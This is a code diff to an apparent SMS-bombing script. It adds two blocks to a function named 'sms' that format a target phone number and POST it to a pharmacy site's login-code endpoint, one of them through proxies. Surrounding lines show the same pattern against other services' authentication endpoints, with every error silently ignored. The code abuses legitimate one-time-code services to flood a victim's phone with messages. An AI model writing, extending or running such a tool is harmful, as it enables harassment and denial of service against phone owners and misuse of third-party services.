@@ -86,6 +86,35 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					payload = {
+						"phone": num2,
+						"u": "U"
+					}
+					requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407", json=payload, proxies = proxies)
+				except:
+					pass
+
+				try:
 					payload = {
 						"phone": number
 					}
@@ -327,6 +356,35 @@ def sms(prx, number, tm, code):
 						"username": number
 					}
 					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					payload = {
+						"phone": num2,
+						"u": "U"
+					}
+					requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407", json=payload)
 				except:
 					pass
 
